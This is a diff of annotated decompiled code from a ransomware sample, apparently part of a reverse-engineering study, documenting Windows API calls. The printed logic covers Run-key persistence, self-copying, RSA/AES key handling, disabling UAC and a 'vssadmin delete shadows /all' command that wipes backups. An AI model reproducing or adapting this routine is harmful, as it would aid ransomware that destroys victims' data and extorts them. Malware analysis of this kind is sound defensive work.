@@ -17,22 +17,26 @@ WPARAM FUN_004018a0(void)
   
   /* Allocates the specified number of bytes from the heap.
         uFlags = 0x40 : GMEM_ZEROINIT (Initializes memory contents to zero)
-        dbBytes = 0x8000 : The number of bytes to allocate */
-  uint *current_exec_path = (uint *)GlobalAlloc(0x40,0x8000); 
+        dbBytes = 0x8000 : The number of bytes to allocate 
+    If the function succeeds, the return value is a handle to the newly allocated memory object.
+  */
+  uint *handle_memory_heap = (uint *)GlobalAlloc(0x40,0x8000); 
 
   /* Retrieves the fully qualified path for the file that contains the specified module
         hModule : If this parameter is NULL, retrieves the path of the executable file of the current process
         lpFilename = Pointer to a buffer that receives the fully qualified path of the module
-        nSize = size of lpFilename buffer */
-  GetModuleFileNameA((HMODULE)0x0,(LPSTR)current_exec_path,0x8000); 
+        nSize = size of lpFilename buffer 
+    handle_memory_heap = "C:\\Users\\IEUser\\Documents\\ransomware"
+  */
+  GetModuleFileNameA((HMODULE)0x0,(LPSTR)handle_memory_heap,0x8000); 
 
   /* Compares two character strings. The comparison is not case-sensitive. 
     lpString1 > lpString2 : val_cmp > 0
     lpString1 < lpString2 : val_cmp < 0 
     lpString1 == lpString2 : val_cmp = 0*/
-  val_cmp = lstrcmpiA("c:\\Windows\\notepad+++.exe",(LPCSTR)current_exec_path);
+  val_cmp = lstrcmpiA("c:\\Windows\\notepad+++.exe",(LPCSTR)handle_memory_heap);
 
-  // Only enter if current_exec_path != "c:\\Windows\\notepad+++.exe"
+  // Only enter if handle_memory_heap != "c:\\Windows\\notepad+++.exe"
   if (val_cmp != 0) {
         /* Opens the specified registry key.
             hKey = 0x80000002 = HKEY_LOCAL_MACHINE : A handle to an open registry key.
@@ -40,17 +44,20 @@ WPARAM FUN_004018a0(void)
             ulOptions : Specifies the option to apply when opening the key.
             samDesired : A mask that specifies the desired access rights to the key to be opened.
             phkResult : A pointer to a variable that receives a handle to the opened key.
+
+            phkResult = handle_reg_key = 0x200
         */
         RegOpenKeyExA((HKEY)0x80000002,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,0xf013f,&handle_reg_key);
 
         /* Determines the length of the specified string
             lpString : The null-terminated string to be checked.
+            DVar2 = 52
         */
         DVar2 = lstrlenA("c:\\Windows\\notepad.exe \"c:\\How To Restore Files.txt\"");
 
         /* Sets the data and type of a specified value under a registry key.
             hKey : A handle to an open registry key.
-            lpValueName = s_decrypt_0040453e = "decrypt" : The name of the value to be set.
+            lpValueName = "decrypt" : The name of the value to be set.
             Reserved : This parameter is reserved and must be zero.
             dwType = 1 = REG_SZ = a string : The type of data pointed to by the lpData parameter. 
             lpData : The data to be stored.
@@ -65,7 +72,7 @@ WPARAM FUN_004018a0(void)
         
         /* Sets the data and type of a specified value under a registry key.
             hKey : A handle to an open registry key.
-            lpValueName = s_notepad++_0040457b = "notepad++" : The name of the value to be set.
+            lpValueName = "notepad++" : The name of the value to be set.
             Reserved : This parameter is reserved and must be zero.
             dwType = 1 = REG_SZ = a string : The type of data pointed to by the lpData parameter. 
             lpData = "c:\\Windows\\notepad+++.exe" : The data to be stored.
@@ -83,7 +90,7 @@ WPARAM FUN_004018a0(void)
             lpNewFileName : The name of the new file.
             bFailIfExists
         */
-        CopyFileA((LPCSTR)current_exec_path,"c:\\Windows\\notepad+++.exe",0);
+        CopyFileA((LPCSTR)handle_memory_heap,"c:\\Windows\\notepad+++.exe",0);
         
         nCmdShow = 5;
   }
@@ -91,16 +98,19 @@ WPARAM FUN_004018a0(void)
   /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
   This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
         phProv : A pointer to a handle of a CSP.
-        szContainer : The key container name
-        szProvider : A null-terminated string that contains the name of the CSP to be used.
-        dwProvType = 0x1 = PROV_RSA_FULL : Specifies the type of provider to acquire.
-        dwFlags = 0x10 = CRYPT_DELETEKEYSET : Flag values.
+        szContainer : The key container name, 
+        szProvider : A null-terminated string that contains the name of the CSP to be used. If this parameter is NULL, the user default provider is used. 
+        dwProvType = 0x1 = PROV_RSA_FULL : Specifies the type of provider to acquire. (source : https://futex.re/mediawiki/index.php/CryptoAPI)
+            The PROV_RSA_FULL provider type supports both digital signatures and data encryption. It is considered a general purpose CSP. The RSA public key algorithm is used for all public key operations.
+        dwFlags = 0x10 = CRYPT_DELETEKEYSET : Delete the key container specified by szContainer. 
+            If szContainer is NULL, the key container with the default name is deleted. All key pairs in the key container are also destroyed.
   */
   CryptAcquireContextA((HCRYPTPROV *)&handle_CSP,(LPCSTR)0x0,(LPCSTR)0x0,1,0x10); // Delete key container specified by szContainer
 
    /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
   This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
         dwFlags = 0xf0000000 = CRYPT_VERIFYCONTEXT : Flag values.
+            This option is intended for applications that are using ephemeral keys, or applications that do not require access to persisted private keys, such as applications that perform only hashing, encryption, and digital signature verification.
   */
   ret_val = CryptAcquireContextA((HCRYPTPROV *)&handle_CSP,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);
 
@@ -113,15 +123,19 @@ WPARAM FUN_004018a0(void)
     hProv : The handle of a CSP obtained with the CryptAcquireContext function
     pbData : A BYTE array that contains a PUBLICKEYSTRUC BLOB header followed by the encrypted key
     dwDataLen : Contains the length, in bytes, of the key BLOB
-    hPubKey : A handle to the cryptographic key that decrypts the key stored in pbData.
+    hPubKey : A handle to the cryptographic key that decrypts the key stored in pbData. If the key BLOB is not encrypted (for example, a PUBLICKEYBLOB), then this parameter is not used, and should be zero.
     dwFlags : Currently used only when a public/private key pair in the form of a PRIVATEKEYBLOB is imported into the CSP.
     phKey : A pointer to a HCRYPTKEY value that receives the handle of the imported key.
+
+    The key BLOB is a PUBLICKEYBLOB.
   */
   CryptImportKey((HCRYPTPROV)handle_CSP,&DAT_004049fd,0x114,0,0,&handle_enc_key);
 
   /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
   This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
         dwProvType = 0x18 = PROV_RSA_AES : Specifies the type of provider to acquire.
+            The PROV_RSA_AES provider type supports both digital signatures and data encryption.
+            The RSA public key algorithm is used for all public key operations.
         dwFlags = 0xf0000000 = CRYPT_VERIFYCONTEXT : Flag values.
   */
   CryptAcquireContextA(&handle_CSP2,(LPCSTR)0x0,(LPCSTR)0x0,0x18,0xf0000000);
@@ -130,13 +144,13 @@ WPARAM FUN_004018a0(void)
     A handle to the key or key pair is returned in phKey. This handle can then be used as needed with 
     any CryptoAPI function that requires a key handle.
         hProv : A handle to a cryptographic service provider (CSP) created by a call to CryptAcquireContext.
-        Algid = 0x6610 = CALG_AES_256 : An ALG_ID value that identifies the algorithm for which the key is to be generated.
+        Algid = 0x6610 = CALG_AES_256 = 256-bit AES block encryption algorithm : An ALG_ID value that identifies the algorithm for which the key is to be generated.
         dwFlags : Specifies the type of key generated.
         phKey : Address to which the function copies the handle of the newly generated key. 
   */
   CryptGenKey(handle_CSP2,0x6610,1,&genKey);
 
-  DWORD size_pbData = 0x2c;
+  DWORD size_pbData = 44;
   /* The CryptExportKey function exports a cryptographic key or a key pair from a cryptographic
      service provider (CSP) in a secure manner.
      hKey : A handle to the key to be exported.
@@ -146,9 +160,9 @@ WPARAM FUN_004018a0(void)
      pbData : A pointer to a buffer that receives the key BLOB data
      pdwDataLen : A pointer to a DWORD value that, on entry, contains the size, in bytes, of the buffer pointed to by the pbData parameter. When the function returns, this value contains the number of bytes stored in the buffer.
   */
-  CryptExportKey(genKey,0,8,0,(BYTE *)current_exec_path,&size_pbData);
+  CryptExportKey(genKey,0,8,0,(BYTE *)handle_memory_heap,&size_pbData);
 
-  size_pbData = 0x2c;
+  size_pbData = 44;
 
   /* The CryptEncrypt function encrypts data.
         hKey : A handle to the encryption key.
@@ -159,7 +173,7 @@ WPARAM FUN_004018a0(void)
         pdwDataLen : A pointer to a DWORD value that , on entry, contains the length, in bytes, of the plaintext in the pbData buffer. 
         dwBufLen : Specifies the total size, in bytes, of the input pbData buffer.
   */
-  CryptEncrypt(handle_enc_key,0,1,0,(BYTE *)current_exec_path,&size_pbData,256);
+  CryptEncrypt(handle_enc_key,0,1,0,(BYTE *)handle_memory_heap,&size_pbData,256);
 
   /* The CryptDestroyKey function releases the handle referenced by the hKey parameter.
         hKey : The handle of the key to be destroyed.
@@ -167,9 +181,14 @@ WPARAM FUN_004018a0(void)
   CryptDestroyKey(handle_enc_key);
 
   /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
-     This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
-        dwProvType = 0x1 = PROV_RSA_FULL : Specifies the type of provider to acquire.
-        dwFlags = 0x10 = CRYPT_DELETEKEYSET : Flag values.
+  This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
+        phProv : A pointer to a handle of a CSP.
+        szContainer : The key container name, 
+        szProvider : A null-terminated string that contains the name of the CSP to be used. If this parameter is NULL, the user default provider is used. 
+        dwProvType = 0x1 = PROV_RSA_FULL : Specifies the type of provider to acquire. (source : https://futex.re/mediawiki/index.php/CryptoAPI)
+            The PROV_RSA_FULL provider type supports both digital signatures and data encryption. It is considered a general purpose CSP. The RSA public key algorithm is used for all public key operations.
+        dwFlags = 0x10 = CRYPT_DELETEKEYSET : Delete the key container specified by szContainer. 
+            If szContainer is NULL, the key container with the default name is deleted. All key pairs in the key container are also destroyed.
   */
   CryptAcquireContextA((HCRYPTPROV *)&handle_CSP,(LPCSTR)0x0,(LPCSTR)0x0,1,0x10);
 
@@ -182,7 +201,7 @@ WPARAM FUN_004018a0(void)
         dwFlagsAndAttributes : The file or device attributes and flags
         hTemplateFile : A valid handle to a template file with the GENERIC_READ access right.
   */
-  HANDLE local_68 = CreateFileA("c:\\Windows\\DECODE.KEY",0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,4,0,(HANDLE)0x0);
+  HANDLE created_file = CreateFileA("c:\\Windows\\DECODE.KEY",0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,4,0,(HANDLE)0x0);
   
   /* Moves the file pointer of the specified file.
         hFile : A handle to the file.
@@ -190,7 +209,7 @@ WPARAM FUN_004018a0(void)
         lpDistanceToMoveHigh : A pointer to the high order 32-bits of the signed 64-bit distance to move.
         dwMoveMethod = 2 = FILE_END : The starting point for the file pointer move, here the starting point is the current end-of-file position.
   */
-  SetFilePointer(local_68,0,(PLONG)0x0,2);
+  SetFilePointer(created_file,0,(PLONG)0x0,2);
 
   /* Writes data to the specified file or input/output (I/O) device.
         hFile : A handle to the file or I/O device
@@ -199,25 +218,31 @@ WPARAM FUN_004018a0(void)
         lpNumberOfBytesWritten : A pointer to the variable that receives the number of bytes written when using a synchronous hFile parameter. 
         lpOverlapped : A pointer to an OVERLAPPED structure is required if the hFile parameter was opened with FILE_FLAG_OVERLAPPED, otherwise this parameter can be NULL. 
   */  
-  WriteFile(local_68,current_exec_path,256,&local_58,(LPOVERLAPPED)0x0);
+  WriteFile(created_file,handle_memory_heap,256,&local_58,(LPOVERLAPPED)0x0);
   
   /* Closes an open object handle.
         hObject : A valid handle to an open object.
   */
-  CloseHandle(local_68);
+  CloseHandle(created_file);
   
-  local_74 = current_exec_path + 256;
+  local_74 = handle_memory_heap + 256;
   
-  FUN_00401816(extraout_ECX,extraout_EDX,current_exec_path,(undefined *)local_74,256);
-  
-  local_74 += 4;
+  /* Return base64 string
+  */
+  FUN_00401816(extraout_ECX,extraout_EDX,handle_memory_heap,(undefined *)local_74,0x100);
+ 
+  // local_74 before = "D7upYMPAIEjKG2ZjlhcQzQwdsVqoOEaF+5CKb1vDF9+42hWRWZuN+CFrtq8WsDr6JQNlwwCZqf0K-4LvSuZUIkx1E5RZCwVlL7r2dSy1wE8rLWgp7Fsr0cpMfWZAJOW11tYH6UKIVdN0Ec4CVPuSkiJ-bJ8OqqrS-a9BwabBQ+nYQj8eVN6R231eqSBkwDF1l16jtHvp15W9LK5ah9aLEVHBy0hg9wjHE-f-ksjNtDALUKgLEkqBlHuvbzDbz+OAeNfGNtSaWoXRNudy7n0qeBxik+b0fdlc9+IH+6eLC8arqmTcfuSjeq7cpH+DvtqxjuERbRHNhmc58oNhAe9wyg=="
+  local_74 += 16;
+  // local_74 after  = "lhcQzQwdsVqoOEaF+5CKb1vDF9+42hWRWZuN+CFrtq8WsDr6JQNlwwCZqf0K-4LvSuZUIkx1E5RZCwVlL7r2dSy1wE8rLWgp7Fsr0cpMfWZAJOW11tYH6UKIVdN0Ec4CVPuSkiJ-bJ8OqqrS-a9BwabBQ+nYQj8eVN6R231eqSBkwDF1l16jtHvp15W9LK5ah9aLEVHBy0hg9wjHE-f-ksjNtDALUKgLEkqBlHuvbzDbz+OAeNfGNtSaWoXRNudy7n0qeBxik+b0fdlc9+IH+6eLC8arqmTcfuSjeq7cpH+DvtqxjuERbRHNhmc58oNhAe9wyg=="
   
   /* Copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks.
         Destination : A pointer to the destination memory block to copy the bytes to.
         Source : A pointer to the source memory block to copy the bytes from.
         Length : The number of bytes to copy from the source to the destination.
   */
-  RtlMoveMemory(0x0040405a + 0x22,local_74,10);
+  // 0x0040407c before = "            \r\nWarning: all your files are infected with an ...
+  RtlMoveMemory(0x0040407c,local_74,10);
+  // 0x0040407c after  = "lhcQzQwdsV  \r\nWarning: all your files are infected with an ...
   
   /* Maps a character string to a UTF-16 (wide character) string.
         CodePage : Code page to use in performing the conversion. 
@@ -228,7 +253,9 @@ WPARAM FUN_004018a0(void)
         lpWideCharStr : Pointer to a buffer that receives the converted string.
         cchWideChar : Size, in characters, of the buffer indicated by lpWideCharStr. 
   */
-  MultiByteToWideChar(3,0,(LPCSTR)local_74,-1,0x004042c1 + 4,10);
+  // 0x004042c9 before = ""
+  MultiByteToWideChar(3,0,(LPCSTR)local_74,-1,0x004042c9,10);
+  // 0x004042c9 after = "lhcQzQwdsV.BI_D"
   
   /* Opens the specified registry key.
         hKey = 0x80000002 = HKEY_LOCAL_MACHINE : A handle to an open registry key.
@@ -253,7 +280,7 @@ WPARAM FUN_004018a0(void)
     If the function succeeds, the return value is ERROR_SUCCESS. If the function fails, the return value is a system error code.
   */
   
-  LSTATUS ret_status = RegQueryValueExA(handle_reg_key,"notepad++",(LPDWORD)0x0,(LPDWORD)0x0,(LPBYTE)(0x0040405a + 0x22),&size_lpData);
+  LSTATUS ret_status = RegQueryValueExA(handle_reg_key,"notepad++",(LPDWORD)0x0,(LPDWORD)0x0,(LPBYTE)0x0040407c,&size_lpData);
   
   if ((ret_status != 0) || (size_lpData != 10)) {
     /* Sets the data and type of a specified value under a registry key.
@@ -267,7 +294,9 @@ WPARAM FUN_004018a0(void)
     RegSetValueExA(handle_reg_key,"notepad++",0,1,(BYTE *)local_74,10);
   }
   
+  // local_74 before  = "lhcQzQwdsVqoOEaF+5CKb1vDF9+42hWRWZuN+CFrtq8WsDr6JQNlwwCZqf0K-4LvSuZUIkx1E5RZCwVlL7r2dSy1wE8rLWgp7Fsr0cpMfWZAJOW11tYH6UKIVdN0Ec4CVPuSkiJ-bJ8OqqrS-a9BwabBQ+nYQj8eVN6R231eqSBkwDF1l16jtHvp15W9LK5ah9aLEVHBy0hg9wjHE-f-ksjNtDALUKgLEkqBlHuvbzDbz+OAeNfGNtSaWoXRNudy7n0qeBxik+b0fdlc9+IH+6eLC8arqmTcfuSjeq7cpH+DvtqxjuERbRHNhmc58oNhAe9wyg=="
   *(undefined4 *)((int)local_74 + 10) = 0;
+  // local_74 after  = "lhcQzQwdsV"
 
   /* Sets the data and type of a specified value under a registry key.
       hKey : A handle to an open registry key.
@@ -277,7 +306,7 @@ WPARAM FUN_004018a0(void)
       lpData : The data to be stored.
       cbData : The size of the information pointed to by the lpData parameter, in bytes.
   */
-  RegSetValueExA(handle_reg_key,(LPCSTR)local_74,0,3,(BYTE *)current_exec_path,256);
+  RegSetValueExA(handle_reg_key,(LPCSTR)local_74,0,3,(BYTE *)handle_memory_heap,256);
 
   /* Closes a handle to the specified registry key.
       hKey : A handle to the open key to be closed.
@@ -288,7 +317,7 @@ WPARAM FUN_004018a0(void)
       Destination : A pointer to the memory block to be filled with zeros.
       Length : The number of bytes to fill with zeros.
   */
-  RtlZeroMemory(current_exec_path,32768);
+  RtlZeroMemory(handle_memory_heap,0x8000);
 
   /* Opens the specified registry key.
       hKey = 0x80000002 = HKEY_LOCAL_MACHINE : A handle to an open registry key.
@@ -307,9 +336,9 @@ WPARAM FUN_004018a0(void)
       lpData : The data to be stored.
       cbData : The size of the information pointed to by the lpData parameter, in bytes.
   */
-  RegSetValueExA(handle_reg_key,"PromptOnSecureDesktop",0,4,(BYTE *)current_exec_path,4);
-  RegSetValueExA(handle_reg_key,"EnableLUA",0,4,(BYTE *)current_exec_path,4);
-  RegSetValueExA(handle_reg_key,"ConsentPromptBehaviorAdmin",0,4,(BYTE *)current_exec_path,4);
+  RegSetValueExA(handle_reg_key,"PromptOnSecureDesktop",0,4,(BYTE *)handle_memory_heap,4);
+  RegSetValueExA(handle_reg_key,"EnableLUA",0,4,(BYTE *)handle_memory_heap,4);
+  RegSetValueExA(handle_reg_key,"ConsentPromptBehaviorAdmin",0,4,(BYTE *)handle_memory_heap,4);
   
   /* Closes a handle to the specified registry key.
       hKey : A handle to the open key to be closed.
@@ -321,7 +350,8 @@ WPARAM FUN_004018a0(void)
       lpBuffer : A pointer to a buffer that receives the contents of the specified environment variable as a null-terminated string.
       nSize : The size of the buffer pointed to by the lpBuffer parameter, including the null-terminating character, in characters.
   */
-  GetEnvironmentVariableA("ComSpec",(LPSTR)current_exec_path,1500);
+  GetEnvironmentVariableA("ComSpec",(LPSTR)handle_memory_heap,1500);
+  // handle_memory_heap = "C:\Windows\system32\cmd.exe"
 
   /* Performs an operation on a specified file.
       hwnd : A handle to the parent window used for displaying a UI or error messages. This value can be NULL if the operation is not associated with a window.
@@ -331,12 +361,12 @@ WPARAM FUN_004018a0(void)
       lpDirectory : A pointer to a null-terminated string that specifies the default (working) directory for the action. If this value is NULL, the current working directory is used.
       nShowCmd : The flags that specify how an application is to be displayed when it is opened.
   */
-  ShellExecuteA((HWND)0x0,(LPCSTR)0x0,(LPCSTR)current_exec_path,"/c vssadmin delete shadows /all",(LPCSTR)0x0,0);
+  ShellExecuteA((HWND)0x0,(LPCSTR)0x0,(LPCSTR)handle_memory_heap,"/c vssadmin delete shadows /all",(LPCSTR)0x0,0);
   
   /* Frees the specified global memory object and invalidates its handle.
       hMem : A handle to the global memory object.
   */
-  GlobalFree(current_exec_path);
+  GlobalFree(handle_memory_heap);
   
   /* Controls whether the system will handle the specified types of serious errors or whether the process will handle them.
       uMode = 1 = SEM_FAILCRITICALERRORS = The system does not display the critical-error-handler message box. Instead, the system sends the error to the calling process. : The process error mode.
